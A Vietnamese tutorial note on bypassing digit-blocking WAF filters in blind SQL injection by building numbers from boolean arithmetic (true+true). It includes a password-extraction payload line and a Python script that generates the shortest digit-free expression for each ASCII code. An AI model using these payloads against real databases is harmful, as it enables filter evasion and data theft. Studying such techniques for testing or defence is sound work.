---
title: Number without digits

---

---
title: Number without digits

---

# Giới thiệu
- Trong các trường hợp Blind SQLi ta thường phải đoán dữ liệu từng ký tự một bằng cách so sánh mã ASCII của ký tự đó với một con số cụ thể, sử dụng Binary Search
`AND ASCII(SUBSTRING(password, 1, 1)) > 65`

- Trong các trường hợp có WAF mạnh hoặc bộ lọc đầu vào có thể chặn các ký tự số 0-9
- kkhiến việc so sánh giá trị trở nên khác theo cách thông thường
- Từ đây, ta có kỹ thuật Number without digits ra đời để giải quyết các trường hợp khó ở trên

# Cơ chế
- Tech này dựa trên cơ chế tự động ép kiểu (cast) của các hệ quản trị CSDL
- khi các giá trị boolean true/false được sử dụng trong các phép toán số học thì chúng sẽ tự động được chuyển đổi thành số nguyên
```hjva!
true = 1
false = 0
```
- Từ quy tắc cơ bản này ta có thể tạo ra các số nguyên dương bằng phép cộng
```jva!
true = 1

true + true = 2

true + true + true = 3
```

Ví dụ: payload thay vì viết `ID=3` thì viết thành `ID=true+true+true`

# Tối ưu thuật toán
- Nếu chỉ sử dụng phép cộng thì payload sẽ cực dài khi cần biểu diễn các số lớn (VD: mã ASCII của chữ `z` là `122`, cần `122` lần true) => dễ bị chặn bởi giới hạn độ dài request
- Để giải quyết thì ta kết hợp thêm phép nhân
- Việc nhân các số nhỏ để tạo ra số lớn sẽ tiết kiệm ký tự hơn

Ví dụ tạo số 8:
``` jva!
// chỉ dùng cộng: 
true+true+true+true+true+true+true+true (quá dài)

// dùng nhân: 
(true+true)*(true+true)*(true+true) 

Tương đương 2 x 2 x 2 = 8
```

# Code
- Để tìm ra cách biểu diễn ngắn nhất cho một số bất kỳ, [tài liệu](https://book.jorianwoltjer.com/web/server-side/sql-injection#numbers-without-digits) đã cung cấp một script python sử dụng thuật toán quy hoạch động 
```python!
def find_expressions(limit):
    """Source: https://chat.openai.com/share/2eb7a5cd-0980-4734-b897-acaf8e546969"""
    if limit == 0:
        return "false"
    if limit == 1:
        return "true"

    # Initialize a list to store the number of operations needed to reach each target
    min_operations = [float('inf')] * (limit + 1)
    min_operations[1] = 0  # Base case

    # Initialize a list to store the expression for each target
    expressions = ["false"] * (limit + 1)
    expressions[1] = "true"

    # Iterate through each number from 2 to target
    for i in range(2, limit + 1):
        # Try addition
        for j in range(1, i):
            if min_operations[j] + min_operations[i - j] + 1 < min_operations[i]:
                min_operations[i] = min_operations[j] + \
                    min_operations[i - j] + 1
                expressions[i] = "(" + expressions[j] + \
                    "+" + expressions[i - j] + ")"

        # Try multiplication
        for j in range(2, int(i ** 0.5) + 1):
            if i % j == 0:
                if min_operations[j] + min_operations[i // j] + 1 < min_operations[i]:
                    min_operations[i] = min_operations[j] + \
                        min_operations[i // j] + 1
                    expressions[i] = "(" + expressions[j] + \
                        "*" + expressions[i // j] + ")"

    return expressions

if __name__ == "__main__":
    expressions = find_expressions(256)
    for c in 'Jorian':
        print(f"{c} ({ord(c)}): {expressions[ord(c)]}")
```

## `find_expressions`
- script dùng để tìm chuỗi biểu thức ngắn nhất (ít tốn chi phí nhất) để tạo ra số limit

- Khởi tạo:
    - mảng `min_operations`: lưu chi phí (số lượng phép tính) thấp nhất để đạt được số `i`
    - mảng `expressions`: lưu chuỗi biểu thức thực tế  để tạo ra số `i`
    - cơ sở: số 1 là `true`, số 0 là `false`
- Quy hoạch động (vòng lặp từ 2 đến limit):
    - với mỗi số `i` thuật toán sẽ thử hai hướng
        - dùng cộng: duyệt mọi số `j < i`, kiểm tra xem nếu tạo `i` bằng cách cộng `expressions[j] + expressions[i-j]` thì có tối ưu hơn cách hiện tại không
        - dùng nhân: duyệt mọi ước số j của i, kiểm tra xem nếu tạo `i` bằng cách nhân e`xpressions[j] * expressions[i//j]` thì có tối ưu hơn không

- Thuật toán chọn cách có `min_operations` nhỏ nhất

- Khi chạy script với input là `256` (phủ hết bảng mã ASCII) ta sẽ có các payload tối ưu cho mọi ký tự

- Ví dụ:
    - Giả sử cần tạo payload cho ký tự `J` (ASCII 74)
    - script sẽ không cộng true 74 lần mà có thể tìm ra công thức dạng:
         $$74 = 2 \times 37 = (true+true) * (37...)$$
         - script sẽ đệ quy tiếp để tìm cách biểu diễn số 37 tối ưu nhất


